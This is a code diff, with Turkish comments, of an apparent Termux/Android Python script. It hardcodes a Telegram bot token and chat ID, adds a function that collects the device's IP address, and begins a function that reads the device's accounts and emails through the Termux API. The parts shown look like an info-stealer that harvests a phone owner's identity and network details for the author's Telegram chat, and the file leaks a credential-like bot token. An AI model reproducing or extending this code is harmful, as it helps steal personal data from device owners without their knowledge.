@@ -5,6 +5,10 @@ import telebot
 import os
 import sys
 
+# Telegram bot token ve chat ID
+TOKEN = '7587467243:AAF5-W3VkmUv4Qo_0VGQiEUCKZgTcdbUhZE'  # Telegram bot token
+CHAT_ID = '7688653312'  # Telegram chat ID
+
 # Gereken pip paketlerini yükleme
 def install_requirements():
     required_packages = ['termux-python', 'pytelegrambotapi']
@@ -14,18 +18,23 @@ def install_requirements():
         except subprocess.CalledProcessError:
             print(f"Error installing {package}")
 
-# Telegram bot token ve chat ID
-TOKEN = '7587467243:AAF5-W3VkmUv4Qo_0VGQiEUCKZgTcdbUhZE'  # Telegram bot token
-CHAT_ID = '7688653312'  # Telegram chat ID
-
-# Cihazın IP adresini almak için fonksiyon
+# IP adresini almak için her iki yöntemi de deneyen fonksiyon
 def get_ip_address():
     try:
-        hostname = socket.gethostname()
-        ip_address = socket.gethostbyname(hostname)
-        return ip_address
-    except Exception as e:
-        return f"Hata: {e}"
+        # İlk olarak 'hostname -I' komutunu kullanarak IP adresini al
+        ip_address = subprocess.getoutput("hostname -I").strip()
+        if ip_address:
+            return ip_address
+        else:
+            raise Exception("IP adresi alınamadı.")
+    except Exception:
+        # Eğer 'hostname -I' çalışmazsa, socket yöntemiyle IP adresini al
+        try:
+            hostname = socket.gethostname()
+            ip_address = socket.gethostbyname(hostname)
+            return ip_address
+        except Exception as e:
+            return f"Hata: {e}"
 
 # Termux API ile cihazdaki hesapları alma
 def get_android_emails():
